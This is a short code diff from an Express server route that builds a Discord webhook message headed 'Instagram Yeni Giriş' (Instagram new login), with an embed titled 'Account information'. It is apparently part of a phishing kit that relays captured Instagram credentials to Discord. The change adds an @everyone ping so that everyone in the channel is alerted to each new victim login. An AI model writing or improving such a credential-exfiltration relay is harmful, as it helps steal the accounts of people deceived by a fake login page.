@@ -17,7 +17,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Prepare Discord webhook message
       const message = {
-        content: "🚨 **Instagram Yeni Giriş** 🚨",
+        content: "🚨 **Instagram Yeni Giriş** 🚨 @everyone",
         embeds: [{
           title: "Hesap Bilgileri;",
           color: 16426522, // Instagram pembemsi renk
